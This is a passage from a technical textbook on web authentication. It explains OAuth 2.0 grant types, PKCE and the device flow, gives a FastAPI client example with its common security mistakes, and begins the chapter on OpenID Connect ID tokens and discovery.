- `GET /books` → requires a valid, non-expired, non-revoked access token via `Authorization: Bearer`.
- `POST /refresh` → implements full rotation (section 8.9): old refresh token is invalidated, a new access + refresh token pair is issued.
- `POST /logout` → revokes the current refresh token server-side.
- Demonstrate, with `curl`, the full lifecycle: login, use the access token, wait for (or force) expiration, refresh, confirm the *old* refresh token no longer works (rotation), and logout.

---

## Preparing for Chapter 9

JWT gives you a robust way to prove identity between a client and *your own* server. But what happens when a user wants to log into *your* app using their *Google* account, without ever handing your app their Google password? That requires a standardized way for one system to grant *limited, delegated* access to another — which is exactly what **OAuth 2.0** is for. Chapter 9 builds it from absolute first principles: why it exists, its full vocabulary, and every major grant type, with complete request/response traces.

---

*End of Chapter 8.*

---

# Chapter 9 — OAuth 2.0

## 9.0 Where we left off

Chapter 8 ended with a very specific, very common scenario: "Sign in with Google" on some app you use every day. Stop and think about what that *cannot* mean, mechanically: your app cannot possibly be sending your actual Google password anywhere except google.com's own login page — your app should never see it at all. So what actually happens? OAuth 2.0 is the standardized answer, and this chapter builds it from the ground up.

---

## 9.1 Why OAuth exists

**The problem, stated precisely:** Suppose a photo-printing website wants to print photos from your Google Photos account. Before OAuth existed as a standard, the only way to do this was for you to type your actual Google username and password directly into the photo-printing site, which would then log into Google *as you* to fetch your photos.

```
   THE OLD, BROKEN WAY ("password anti-pattern"):

   You ──── gives your REAL Google password ────> PhotoPrintSite
                                                          │
                                                          │  PhotoPrintSite now
                                                          │  logs into Google
                                                          │  using YOUR password
                                                          ▼
                                                        Google
```

**Every single problem with this, precisely:**
- PhotoPrintSite now has your **full** Google password — not just "read my photos" access, but full account access, including your email, your Drive, your ability to reset other services' passwords via "forgot password" email flows, everything.
- PhotoPrintSite must now **store** your Google password somewhere, becoming a juicy, high-value target for attackers, and a single point of failure for your Google account's security.
- You have **no way to grant limited access** — it's all-or-nothing; "let them see just my photos" isn't expressible.
- You have **no clean way to revoke** just PhotoPrintSite's access without changing your actual Google password (which would also log you out of every other legitimate device/app using that password).
- Google has **no way to know** this login came from PhotoPrintSite specifically, rather than being you personally logging in — no audit trail, no way to revoke "just this app."

**OAuth's solution, at a glance:** instead of handing over your actual password, you're redirected to Google's *own* login page (PhotoPrintSite never sees your password at all), you approve a *specific, limited* set of permissions ("read my photos" — not "everything"), and Google hands PhotoPrintSite a **limited-scope, revocable access token** instead of your credentials.

```
   THE OAUTH WAY:

   You ──── redirected to ────> Google's OWN login page
                                       │
                                       │  you log in DIRECTLY with Google,
                                       │  PhotoPrintSite never sees this
                                       ▼
                              "PhotoPrintSite wants to:
                               ✓ View your photos
                               (NOT: read your email, NOT: access Drive)
                               [Approve] [Deny]"
                                       │
                                       │  you approve
                                       ▼
   You <──── redirected back with an authorization code ──── Google
     │
     │  PhotoPrintSite exchanges that code for a LIMITED,
     │  REVOCABLE access token — never your password
     ▼
   PhotoPrintSite can now call Google's API, but ONLY for
   photo-reading — nothing else — and you can revoke this
   access anytime from your Google account settings, without
   touching your actual password.
```

---

## 9.2 History and context

OAuth 1.0 was published in 2007. It worked, but was notoriously complex to implement correctly (it required precise cryptographic request-signing on every call). **OAuth 2.0**, published in 2012 (RFC 6749), simplified the model substantially by relying on HTTPS (Chapter 12) for transport security instead of per-request signing, at the cost of making HTTPS a hard, non-negotiable requirement throughout. OAuth 2.0 is what nearly every "Sign in with X" and third-party API integration uses today, and is the version this entire chapter covers. It is worth knowing OAuth 1.0 and 2.0 are **not compatible** with each other — they're different protocols that happen to share a name lineage.

---

## 9.3 OAuth Terminology — the full vocabulary

OAuth introduces more named roles than any scheme so far in this book. Get these precisely right before touching any flow — every diagram from section 9.5 onward depends on you knowing exactly who's who.

| Term | Definition |
|---|---|
| **Resource Owner** | The user who owns the data/account being accessed — in the example above, **you** |
| **Client** | The application requesting access on the resource owner's behalf — PhotoPrintSite |
| **Authorization Server** | The server that authenticates the resource owner and issues tokens — Google's own login/consent system |
| **Resource Server** | The server hosting the actual protected data, which accepts access tokens — Google Photos' API |
| **Scopes** | The specific, named permissions being requested (e.g., `photos.read`) — the mechanism that makes "limited access," not "all or nothing," possible |
| **Consent** | The resource owner's explicit approval of the requested scopes — the "[Approve] [Deny]" screen |
| **Access Token** | A short-lived credential the client uses to call the resource server — conceptually identical to Chapter 8's JWT access token, and is very often literally implemented as one |
| **Refresh Token** | A long-lived credential the client uses to obtain new access tokens without repeating the full user-facing flow — directly analogous to Chapter 8, section 8.8 |
| **Authorization Code** | A short-lived, single-use code, handed to the client after the resource owner approves, later exchanged for an access token |
| **Client Credentials** | A client's own identity (a `client_id` and `client_secret`) — proves *which application* is asking, separate from the resource owner's identity |
| **PKCE** | **P**roof **K**ey for **C**ode **E**xchange — an additional security mechanism protecting the authorization code flow, especially for clients that can't safely keep a secret (mobile apps, single-page web apps) — full detail in section 9.7 |

**In our example, mapped precisely:**

```
   Resource Owner:      You
   Client:              PhotoPrintSite
   Authorization Server: accounts.google.com
   Resource Server:      photoslibrary.googleapis.com
   Scope requested:      "photoslibrary.readonly"
```

> **Common Mistake:** Confusing the Authorization Server and the Resource Server — they are conceptually distinct roles (login/consent vs. actual data), even though for a given provider they're sometimes operated by the same company (as with Google in our example) and sometimes even the *same physical service*. In more advanced setups (Chapter 10, Chapter 13's Identity Providers) they are frequently entirely separate systems.

---

## 9.4 Grant Types — overview

OAuth defines several distinct **flows** ("grant types"), each suited to a different scenario, based on: is there a human resource owner involved at all? Can the client safely keep a secret? Does the client have a full browser available?

| Grant Type | When to use |
|---|---|
| **Authorization Code** | The standard flow for apps with a backend server and a human user — the most common, most secure general-purpose flow |
| **Client Credentials** | No human/resource-owner involved at all — pure machine-to-machine, the client is acting on its own behalf |
| **Device Flow** | Devices with no browser or limited input (smart TVs, CLI tools) — the user approves on a *separate* device |
| **Refresh Token** | Not an initial flow — used afterward, by any of the above, to get new access tokens without repeating the whole flow |

We build each of these in full below.

---

## 9.5 Authorization Code Flow — the main event

This is the flow underlying essentially every "Sign in with Google/GitHub/Facebook" button you've ever clicked. Full sequence, every URL and request/response named:

```
   Resource Owner        Client               Authorization        Resource
   (You, in browser)    (PhotoPrintSite)         Server              Server
        │                    │                      │                   │
        │  1. Click "Connect │                      │                   │
        │     Google Photos"  │                      │                   │
        │ ──────────────────>│                      │                   │
        │                    │  2. Redirect browser   │                   │
        │                    │     to Auth Server's    │                   │
        │                    │     /authorize URL      │                   │
        │ <──────────────────│                      │                   │
        │                    │                      │                   │
        │  3. Browser follows redirect                  │                   │
        │ ─────────────────────────────────────────>│                   │
        │                    │                      │                   │
        │  4. Log in + see consent screen               │                   │
        │ <─────────────────────────────────────────│                   │
        │  5. Approve                                    │                   │
        │ ─────────────────────────────────────────>│                   │
        │                    │                      │                   │
        │  6. Redirect back to Client's redirect_uri,     │                   │
        │     WITH an authorization code attached           │                   │
        │ <─────────────────────────────────────────│                   │
        │                    │                      │                   │
        │  7. Browser follows redirect back           │                   │
        │ ──────────────────>│                      │                   │
        │                    │  8. Client's SERVER    │                   │
        │                    │     (not the browser)   │                   │
        │                    │     exchanges the code    │                   │
        │                    │     for tokens, directly    │                   │
        │                    │     server-to-server         │                   │
        │                    │ ────────────────────>│                   │
        │                    │  9. access_token +      │                   │
        │                    │     refresh_token         │                   │
        │                    │ <────────────────────│                   │
        │                    │                      │                   │
        │                    │  10. Client calls Resource Server           │
        │                    │      using access_token                      │
        │                    │ ──────────────────────────────────────────>│
        │                    │  11. Protected data (photos)                  │
        │                    │ <──────────────────────────────────────────│
```

**Step 2 in full detail — the redirect URL, every parameter named:**
```
GET https://accounts.google.com/o/oauth2/v2/auth?
    response_type=code&
    client_id=photoprintsite-12345&
    redirect_uri=https://photoprintsite.com/oauth/callback&
    scope=photoslibrary.readonly&
    state=xyz789random
```

| Parameter | Meaning |
|---|---|
| `response_type=code` | "I want the Authorization Code flow" |
| `client_id` | Identifies *which registered application* PhotoPrintSite is (public, not secret) |
| `redirect_uri` | Where to send the browser back to after consent — must exactly match a URI pre-registered with the Authorization Server, or the request is rejected (a critical anti-hijacking control) |
| `scope` | The specific permission(s) being requested |
| `state` | A random value the client generates and later verifies on callback — defends against **CSRF** on the OAuth flow itself (an attacker tricking a victim into completing an auth flow the attacker initiated) |

**Step 6 in full detail — the callback redirect:**
```
GET https://photoprintsite.com/oauth/callback?
    code=4/0AY0e-g7abc123uniquecode&
    state=xyz789random
```

The client's server **must** verify the returned `state` matches what it originally generated in step 2, before doing anything else — this is what actually closes the CSRF hole `state` exists to prevent.

**Step 8 in full detail — the code-for-token exchange, happening server-to-server, never visible to the browser or the user:**
```http
POST /token HTTP/1.1
Host: oauth2.googleapis.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=4/0AY0e-g7abc123uniquecode&
redirect_uri=https://photoprintsite.com/oauth/callback&
client_id=photoprintsite-12345&
client_secret=GOCSPX-verysecretvalue
```

**Step 9 — the token response:**
```json
{
  "access_token": "ya29.a0AfH6...",
  "refresh_token": "1//03gK...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "scope": "photoslibrary.readonly"
}
```

> **Critical security point — why the code-for-token exchange happens server-to-server:** Steps 1–7 all happen through the resource owner's browser, meaning the authorization *code* passes through the browser (visible in the URL, browser history, referrer headers, etc.). The `client_secret` in step 8, however, **never** touches the browser — it's a secret known only to the client's own backend server. This is precisely *why* the exchange step must happen server-to-server: even if an attacker somehow intercepted the authorization code from the browser-visible steps, they cannot complete the exchange without also knowing the `client_secret`, which was never exposed there.

---

## 9.6 Client Credentials Flow

**When to use it:** No resource owner at all — this is pure machine-to-machine, the client acting entirely on its own behalf (e.g., a backend service calling another backend service's API, with no individual user involved).

```
   Client (backend service)              Authorization Server
        │                                        │
        │  POST /token                             │
        │  grant_type=client_credentials             │
        │  client_id=...                              │
        │  client_secret=...                            │
        │  scope=orders.read                              │
        │ ─────────────────────────────────────────>│
        │                                        │
        │  {"access_token": "...", "expires_in": 3600}  │
        │ <─────────────────────────────────────────│
        │                                        │
        │  Uses access_token to call the Resource Server │
```

Notice how much shorter this is than section 9.5 — there's no browser redirect, no consent screen, no authorization code, because **there's no human to redirect or ask for consent from**. This is essentially a single request/response exchanging client credentials directly for an access token.

```http
POST /token HTTP/1.1
Host: auth.internal-platform.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id=order-service&client_secret=xyz&scope=inventory.read
```

---

## 9.7 PKCE — protecting clients that can't keep a secret

**The problem PKCE solves:** Section 9.5's flow assumed the client has a backend server capable of safely storing a `client_secret`. But what about a mobile app or a pure browser-based single-page app, where the "client" is code running directly on the user's device? Any secret embedded in a mobile app's compiled code or a SPA's JavaScript bundle can be extracted by anyone with the app installed or the page's source — it isn't actually secret at all.

**Term defined — PKCE:** Proof Key for Code Exchange. A mechanism where the client generates a random secret **at the start of each individual flow** (not a long-lived, embedded secret), proving to the Authorization Server that the *same* client instance that started the flow is the one completing it — without needing any pre-shared, embeddable secret.

```
   1. Client generates a random "code_verifier" (fresh, every single flow)
      code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

   2. Client computes code_challenge = SHA256(code_verifier), Base64Url-encoded
      (this is the ONE-WAY hash, section 8.1 — the challenge reveals
       nothing usable about the verifier)

   3. Authorization request includes the CHALLENGE (not the verifier):
      GET /authorize?...&code_challenge=E9Melhoa2...&code_challenge_method=S256

   4. Later, the token exchange (step 8, section 9.5) includes the
      ORIGINAL verifier:
      POST /token
      grant_type=authorization_code&code=...&code_verifier=dBjftJeZ4CVP...

   5. Authorization Server independently re-computes SHA256(code_verifier)
      and checks it matches the code_challenge from step 3.
      Match -> proceed. Mismatch -> reject.
```

**Why this defends against code interception:** even if an attacker somehow intercepts the authorization *code* (from step 6/7 of section 9.5's browser-visible steps), they cannot complete the token exchange without also producing the matching `code_verifier` — which was never transmitted anywhere except directly from the legitimate client to the Authorization Server at the very end. Today, **PKCE is recommended for all clients, not just ones that can't keep a secret** — it's cheap, adds meaningful defense-in-depth, and is now standard practice even for confidential (server-based) clients.

---

## 9.8 Device Flow

**When to use it:** A device with limited input capability or no browser at all — a smart TV app, a CLI tool — where typing a password directly on the device is impractical or impossible.

```
   Device (e.g. smart TV app)          Authorization Server        User's phone/laptop
        │                                    │                          │
        │  POST /device/code                   │                          │
        │ ─────────────────────────────────>│                          │
        │  {"device_code": "...",              │                          │
        │   "user_code": "WDJB-MJHT",             │                          │
        │   "verification_uri":                     │                          │
        │     "https://google.com/device"}            │                          │
        │ <─────────────────────────────────│                          │
        │                                    │                          │
        │  [ TV displays: "Go to               │                          │
        │    google.com/device and                │                          │
        │    enter code WDJB-MJHT" ]                │                          │
        │                                    │                          │
        │                                    │  User visits URL,           │
        │                                    │  enters code, logs in,       │
        │                                    │  approves                     │
        │                                    │ <─────────────────────────│
        │                                    │                          │
        │  [ meanwhile, TV polls repeatedly: ]  │                          │
        │  POST /token grant_type=              │                          │
        │    device_code, device_code=...         │                          │
        │ ─────────────────────────────────>│                          │
        │  (still pending... "authorization_pending")│                          │
        │ <─────────────────────────────────│                          │
        │  ... TV keeps polling ...              │                          │
        │  POST /token (same, again)              │                          │
        │ ─────────────────────────────────>│                          │
        │  {"access_token": "...", ...}          │  <- now that user approved
        │ <─────────────────────────────────│
```

The elegant idea here: the device never needs any text input capability or browser at all — it just displays a short code and polls; all the actual login/consent interaction happens on a separate device the user already has good input methods for (their phone).

---

## 9.9 Refresh Token Flow

Structurally identical to Chapter 8, section 8.8 — the same purpose, the same mechanism, now formalized as an official OAuth grant type:

```http
POST /token HTTP/1.1
Host: oauth2.googleapis.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&
refresh_token=1//03gK...&
client_id=photoprintsite-12345&
client_secret=GOCSPX-verysecretvalue
```

```json
{
  "access_token": "ya29.a0AfH6-newtoken...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

Note that, unlike a plain application's own refresh flow (Chapter 8), OAuth's refresh request typically requires the `client_secret` again — because the Authorization Server needs to reconfirm *which registered client* is requesting the refresh, not just that a valid refresh token was presented.

---

## 9.10 Reference implementation — being the Client (Python / FastAPI)

This example shows a FastAPI app implementing the *client* side of the Authorization Code flow from section 9.5 — the most common real-world task (integrating "Sign in with X" into your own app), as opposed to building an Authorization Server yourself (a much larger undertaking, generally handled by dedicated software — previewed in Chapter 13).

```python
import secrets
from urllib.parse import urlencode

import httpx
from fastapi import FastAPI, HTTPException
from fastapi.responses import RedirectResponse

app = FastAPI()

CLIENT_ID = "photoprintsite-12345"
CLIENT_SECRET = "GOCSPX-verysecretvalue"     # from environment, never hardcoded
REDIRECT_URI = "https://photoprintsite.com/oauth/callback"
AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth"
TOKEN_URL = "https://oauth2.googleapis.com/token"

# In-memory store mapping state -> whether we issued it; a real app
# would tie this to the user's own session (Chapter 7). See the note
# below on why a global set is not good enough in production.
PENDING_STATES: set[str] = set()

@app.get("/connect-google-photos")
def start_oauth_flow():
    state = secrets.token_urlsafe(16)   # section 9.5, CSRF defense
    PENDING_STATES.add(state)

    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": "photoslibrary.readonly",
        "state": state,
    }
    # urlencode(), NOT manual "&".join(f"{k}={v}") — see the note below.
    return RedirectResponse(f"{AUTH_URL}?{urlencode(params)}")   # step 2, section 9.5

@app.get("/oauth/callback")
async def oauth_callback(code: str, state: str):
    # CRITICAL: verify state BEFORE doing anything else with the code.
    # raise HTTPException — do NOT `return {...}, 400`; see the note below.
    if state not in PENDING_STATES:
        raise HTTPException(status_code=400, detail="invalid_state — possible CSRF attempt")
    PENDING_STATES.discard(state)

    # Step 8, section 9.5 — server-to-server exchange, client_secret
    # never touches the user's browser.
    async with httpx.AsyncClient() as client:
        response = await client.post(TOKEN_URL, data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
        })
    if response.status_code != 200:
        # The provider rejected the exchange (expired code, reused code,
        # redirect_uri mismatch). Fail closed — Chapter 2, section 2.8.
        raise HTTPException(status_code=502, detail="Token exchange failed")
    tokens = response.json()
    # In a real app: store tokens["access_token"] and ["refresh_token"]
    # associated with the logged-in user's own session (Chapter 7/8),
    # NOT sent back to the browser directly.
    return {"message": "Connected!", "scope": tokens.get("scope")}
```

**What's happening internally:** the `state` check at the top of `oauth_callback` is the code-level enforcement of the CSRF defense described in section 9.5 — skipping it (a real, common mistake) leaves the app vulnerable to an attacker initiating their own OAuth flow and tricking a victim into completing it, potentially binding the victim's session to the attacker's third-party account.

> **Three Common Mistakes, all visible in this one short file — each of which "works" in casual testing:**
>
> **1. Building the query string by hand.** `"&".join(f"{k}={v}" ...)` does no percent-encoding, so `redirect_uri=https://photoprintsite.com/oauth/callback` goes out with raw `:` and `/` characters, and a `scope` containing spaces (very common — `"openid email profile"`) breaks the URL outright. The Authorization Server then rejects the request with an opaque `redirect_uri_mismatch`, which sends people hunting through their provider's dashboard for a configuration problem that does not exist. `urlencode()` is not a style preference here.
>
> **2. `return {"error": ...}, 400` does not set a 400 in FastAPI.** Unlike Flask, FastAPI has no tuple-return convention — it serializes the whole tuple as a JSON array and responds **`200 OK`** with a body of `[{"error":"invalid_state"},400]`. So the one branch specifically written to reject a suspected CSRF attempt reports *success* to the caller. Use `raise HTTPException(...)` (or return an explicit `JSONResponse(status_code=...)`).
>
> **3. `PENDING_STATES` as a global set is not a real CSRF defense.** It proves *somebody* started a flow on this server — not that **this browser** did. An attacker can hit `/connect-google-photos` themselves, harvest a valid `state`, and use it to complete a flow in the victim's browser, which is precisely the attack `state` exists to stop. The value must be bound to the specific user's session (store it in the session from Chapter 7, or in a short-lived `HttpOnly` cookie) and compared against *that* on callback. The global set also leaks memory and breaks the moment you run more than one server instance.

---

## 9.11 Security considerations

- **Always validate `redirect_uri` against an exact, pre-registered value** on the Authorization Server side — an attacker who could redirect to *their own* server would receive the authorization code themselves.
- **Always verify `state`** on callback, exactly as shown in section 9.10 — skipping this is a common, real vulnerability.
- **Use PKCE for all clients**, not just public ones (section 9.7) — cheap, meaningful defense-in-depth.
- **Never expose a `client_secret` in any client-side code** (mobile app binaries, browser JavaScript) — if the client can't keep a secret, it should not have one; use PKCE-protected flows instead of `client_secret`-based ones for such clients.
- **Request the minimum necessary scope** — following the principle of least privilege (formalized in Chapter 14), don't request `full account access` when `read-only photos` is all that's needed.

> **Common Mistake:** Implementing "Sign in with Google" by treating the returned access token as proof of the user's *identity* within your own app, without a proper identity layer. OAuth access tokens are about *authorization* (Chapter 3's meaning!) — proving the client can access some resource — not necessarily a reliable, standardized statement of *who the user is*. This exact gap is what Chapter 10 (OpenID Connect) exists to close.

---

## Chapter 9 Summary

- OAuth 2.0 exists to eliminate the **password anti-pattern** — letting a client access limited, specific resources on a user's behalf without ever seeing that user's actual password, with revocable, scoped access.
- Core roles: **Resource Owner** (user), **Client** (requesting app), **Authorization Server** (issues tokens, handles login/consent), **Resource Server** (hosts the protected data).
- **Scopes** enable limited, specific permission grants instead of all-or-nothing access; **consent** is the user's explicit approval step.
- The **Authorization Code Flow** is the standard, most common flow: browser-visible steps exchange for a code, then a **server-to-server** exchange (protected by the never-browser-exposed `client_secret`) turns that code into tokens.
- **`state`** defends the flow itself against CSRF; **`redirect_uri`** validation prevents authorization codes from being redirected to an attacker's server.
- **PKCE** lets clients that can't safely keep a long-lived secret (mobile, SPAs) still securely complete the code exchange, using a fresh, per-flow verifier/challenge pair — and is now recommended for all clients.
- **Client Credentials Flow** is for pure machine-to-machine access with no resource owner; **Device Flow** is for input-constrained devices, approving via a separate device.
- **Refresh Token Flow** mirrors Chapter 8's pattern, formalized as an OAuth grant type.
- OAuth access tokens prove *authorization* (can access X), not necessarily reliable *identity* — that distinction motivates Chapter 10.

---

## Interview Questions — Chapter 9

**Q1. What specific problem does OAuth solve that a plain username/password login cannot?**
It lets a client access limited, specific resources on a resource owner's behalf without ever seeing that owner's actual credentials, with the ability to grant narrow scopes (not all-or-nothing access) and revoke that specific client's access independently, without changing the user's actual password.

**Q2. Why does the authorization-code-to-token exchange happen server-to-server rather than through the browser?**
Because that exchange requires the `client_secret`, which must never be exposed to the browser (where it could be intercepted or extracted). The browser-visible steps only ever carry the short-lived, single-use authorization code — even if that were intercepted, completing the exchange still requires the secret that only the client's own backend holds.

**Q3. What does the `state` parameter protect against, and what would go wrong without it?**
It protects against CSRF on the OAuth flow itself — an attacker could otherwise initiate an OAuth flow themselves, then trick a victim into completing the callback step, potentially linking the victim's app session to the attacker's third-party account (or vice versa). The client must generate a random `state` before redirecting, and verify it matches on callback, before trusting the returned code.

**Q4. What problem does PKCE solve, and why is it recommended even for clients that could technically keep a secret?**
It lets a client prove it's the same instance that started a given OAuth flow, without needing a long-lived, pre-shared secret — essential for mobile apps and browser-based SPAs, where any embedded secret could be extracted. It's now recommended universally because it's cheap and adds real defense-in-depth against authorization-code interception, even for clients that do have a legitimate `client_secret`.

**Q5. When would you use the Client Credentials grant instead of the Authorization Code grant?**
When there's no human resource owner involved at all — pure machine-to-machine access, where the client is acting entirely on its own behalf (e.g., one backend service calling another's API) rather than on behalf of a specific user.

---

## Hands-On Exercises — Chapter 9

1. Register a free OAuth application with a real provider (e.g., GitHub's OAuth Apps settings) and manually construct and visit the `/authorize` URL from section 9.5 by hand, tracing each parameter back to its definition in this chapter.
2. Run the FastAPI client example from section 9.10 (against a real or mocked Authorization Server) and deliberately tamper with the `state` value on the callback request — confirm it's rejected, and explain which specific attack this defends against.
3. Compute a PKCE `code_verifier` and its corresponding `code_challenge` by hand (pick a random string, SHA-256 hash it, Base64Url-encode the result) and verify your math against a library's own output.
4. Draw the Device Flow sequence diagram from section 9.8 from memory, then check it against the book — note any step you got wrong and explain why that step is necessary.

## Mini Project — Chapter 9

Build a FastAPI app that implements "Sign in with GitHub" (a free, easy-to-register real OAuth provider) end-to-end.

Requirements:
- `/login` route that redirects to GitHub's authorization endpoint with a properly generated `state`.
- `/callback` route that validates `state`, exchanges the code for tokens server-to-server, and calls GitHub's API (`GET /user`) using the returned access token to fetch the logged-in GitHub user's profile.
- Store the resulting access token tied to a session (reuse Chapter 7's session mechanism) rather than sending it to the browser.
- A short written explanation of exactly which scope(s) you requested and why you chose the minimum necessary.

---

## Preparing for Chapter 10

Chapter 9 ended on a pointed note: an OAuth access token proves the client *can access something* — it doesn't, by itself, give your application a reliable, standardized way to know *who the user is*. Chapter 10 closes that exact gap with **OpenID Connect (OIDC)**, a thin, standardized identity layer built directly on top of everything you just learned in this chapter.

---

*End of Chapter 9.*

---

# Chapter 10 — OpenID Connect (OIDC)

## 10.0 Where we left off

Chapter 9 ended on a precise, important gap: an OAuth access token proves a client *can access some resource* — it says nothing standardized about *who the user is*. This chapter closes that gap with OpenID Connect, and it's a genuinely short chapter, because OIDC is deliberately a *thin layer* on top of everything you already built in Chapter 9, not a separate protocol you learn from scratch.

---

## 10.1 Why OAuth cannot authenticate users, precisely

Let's be exact about *why* this gap exists, rather than just asserting it.

Recall from Chapter 9 that an access token's *only* standardized guarantee is: "the bearer of this token has been granted the following scopes by the Authorization Server." Nothing in the OAuth 2.0 specification says:
- The token format is standardized (it's often opaque — just a random string the Resource Server looks up, exactly like Chapter 6's API keys).
- The token contains any information about *who* authorized it.
- There's a standard way for the *client* to reliably learn the resource owner's identity (name, email, a stable unique ID) at all.

```
   What OAuth 2.0 alone actually guarantees to the Client:

       "Here's an access_token. Use it to call the Resource Server.
        It has been granted these scopes: ['photos.read']."

   What OAuth 2.0 alone does NOT guarantee:

       "This access_token was issued to a user whose stable,
        verifiable identity is user_id=8823, email=anuj@example.com"
```

Some real-world implementations of OAuth *did*, in practice, informally use `Client Credentials`-adjacent hacks to bolt identity onto OAuth before OIDC existed — this was error-prone and non-standardized across providers, which is exactly the problem OIDC was built to solve properly, once and for all, as a formal specification.

> **Interview Tip:** "What's the difference between OAuth and OIDC, in one sentence?" Strong, precise answer: **OAuth 2.0 is an authorization framework** ("can this client access this resource, with these scopes") **and OpenID Connect is an identity layer built on top of it** ("and here, standardized, is who the resource owner actually is"). Saying "OIDC is just OAuth for login" is directionally fine casually, but the precise version above is what signals real understanding.

---

## 10.2 What OIDC adds, concretely

OIDC adds exactly three things on top of OAuth 2.0's existing machinery from Chapter 9:

1. A new, standardized token type: the **ID Token**.
2. A new, reserved scope: `openid` (requesting it signals "I want OIDC's identity layer, not just plain OAuth").
3. A standardized **UserInfo endpoint** for fetching additional profile details.

That's it — no new grant types, no new flow shapes beyond what Chapter 9 already covered; OIDC reuses the Authorization Code Flow (and others) exactly as-is, just adding `openid` to the requested scopes and receiving an extra token back.

---

## 10.3 The ID Token

**Simple explanation:** The ID Token is a JWT (Chapter 8!) that makes a standardized, verifiable statement about who just authenticated — exactly the piece OAuth alone was missing.

**Technical definition:** The ID Token is a signed JWT whose claims are standardized specifically for identity assertions, issued alongside the access token in the same token response.

```json
{
  "access_token": "ya29.a0AfH6...",
  "id_token": "eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJzdWIiOiIxMDc2OTUwODUwMDA2MTYyMTU4MzYiLCJhdWQiOiJwaG90b3ByaW50c2l0ZS0xMjM0NSIsImV4cCI6MTc1NDM5MjAwMCwiaWF0IjoxNzU0Mzg4NDAwLCJlbWFpbCI6ImFudWpAZXhhbXBsZS5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6IkFudWogU2hhcm1hIn0.signature...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

Decoding that ID Token's payload (exactly as you learned to do by hand in Chapter 8, section 8.3):
```json
{
  "iss": "https://accounts.google.com",
  "sub": "107695085000616215836",
  "aud": "photoprintsite-12345",
  "exp": 1754392000,
  "iat": 1754388400,
  "email": "anuj@example.com",
  "email_verified": true,
  "name": "Anuj Sharma"
}
```

| Claim | Meaning (all standardized by OIDC, building directly on Chapter 8's registered claims) |
|---|---|
| `iss` | Issuer — confirms *which* Authorization/Identity Provider issued this — critical to check |
| `sub` | **Subject** — the stable, unique identifier for this user at this issuer; this is the field your app should use as the durable "who is this" key, *not* email (emails can change) |
| `aud` | Audience — confirms this token was issued *for your specific client*, not some other app |
| `email`, `email_verified`, `name` | Standardized profile claims |

> **Critical distinction, worth its own callout:** **Never use the access token to determine user identity.** The access token is for calling the Resource Server; it may well be opaque (just a random string) and carries no guaranteed identity information at all. **Always use the ID Token — and specifically the verified `sub` claim within it** — as your source of truth for "who is this user." This exact confusion is precisely the common mistake flagged at the end of Chapter 9.

**Verifying an ID Token uses exactly Chapter 8's JWT verification process** — check the signature (typically RS256, since a client needs to verify tokens issued by a provider it doesn't share a secret with — directly recalling section 8.5), check `exp`, and additionally check that `iss` matches the expected provider and `aud` matches your own `client_id` — this last check specifically defends against a token issued for a *different* application being replayed against yours.

---

## 10.4 The Discovery Endpoint

**Simple explanation:** Rather than hardcoding every URL an OIDC provider uses (authorization endpoint, token endpoint, UserInfo endpoint, public signing keys...), a client can fetch one well-known URL and get all of them back, in a standardized format.

**Technical definition:** The Discovery Endpoint (formally, the "OpenID Provider Configuration" document) is served at a predictable, standardized path:

```
GET https://accounts.google.com/.well-known/openid-configuration
```

**Example response (abbreviated):**
```json
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  "scopes_supported": ["openid", "email", "profile"],
  "response_types_supported": ["code", "token", "id_token"]
}
```

> **Term defined — `jwks_uri`:** Points to the provider's **JSON Web Key Set** — the actual public keys (recall RS256 from Chapter 8, section 8.5) used to verify ID Token signatures. Providers periodically rotate these keys; fetching them from `jwks_uri` (rather than hardcoding a single public key) lets your client always have the current, correct key without manual updates.

> **Remember:** The Discovery Endpoint is *why* implementing "Sign in with X" for a new, standards-compliant OIDC provider is often just a matter of pointing a well-built OIDC client library at one URL — the library fetches this document once, caches it, and derives every other endpoint and key it needs automatically, rather than you hand-copying five different URLs from documentation (as our simplified Chapter 9 example did).

---

## 10.5 The UserInfo Endpoint

**Simple explanation:** An additional endpoint the client can call, using the access token, to fetch further profile details about the authenticated user beyond what's already in the ID Token.

```http
GET /v1/userinfo HTTP/1.1
Host: openidconnect.googleapis.com
Authorization: Bearer ya29.a0AfH6...
```

```json
{
  "sub": "107695085000616215836",
  "name": "Anuj Sharma",
  "email": "anuj@example.com",
  "email_verified": true,
  "picture": "https://lh3.googleusercontent.com/a/..."
}
```

> **Interview Tip:** "If the ID Token already contains identity claims, why does UserInfo exist too?" A good answer: the ID Token is deliberately kept reasonably small (it's transmitted as part of every login flow, over a redirect URL in some cases), while UserInfo lets a client fetch a richer profile only when actually needed, using the same access token from Chapter 9 — a separation of "the minimal proof of who logged in" from "the full profile data," fetched on demand.

---

## 10.6 The Full OIDC Flow

Directly reusing Chapter 9's Authorization Code Flow, with the OIDC-specific additions highlighted:

```
   Resource Owner        Client               Authorization/Identity
   (You, in browser)    (Your App)                  Provider
        │                    │                          │
        │                    │  1. Redirect to /authorize  │
        │                    │     scope=openid email       │  <- "openid" scope
        │                    │        profile                │     signals OIDC
        │ <──────────────────│                          │
        │  2. Follow redirect, log in, consent              │
        │ ──────────────────────────────────────────────>│
        │  3. Redirect back with authorization code            │
        │ <──────────────────────────────────────────────│
        │                    │  4. Server-to-server code       │
        │                    │     exchange                     │
        │                    │ ────────────────────────────>│
        │                    │  5. access_token AND             │
